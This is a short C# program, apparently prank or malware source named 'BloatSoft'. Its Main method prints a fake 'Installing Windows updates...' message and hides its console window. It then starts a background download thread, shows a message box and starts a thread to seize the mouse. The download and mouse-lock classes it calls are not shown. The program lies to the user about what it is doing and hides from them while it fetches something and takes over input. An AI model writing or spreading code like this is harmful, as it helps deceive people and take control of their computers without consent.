using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net;

namespace BloatSoft
{
    public class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        [STAThread]
        static void Main(string[] args)
        {
            Console.WriteLine("Installing Windows updates...");
            Thread.Sleep(300);
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            Thread dl = new Thread(Download.DownloadFile);
            dl.Start();

            MessageBox.Show("fiem");

            Thread mouseThread = new Thread(LockMouse.move);
            mouseThread.Start();
        }
    }
}
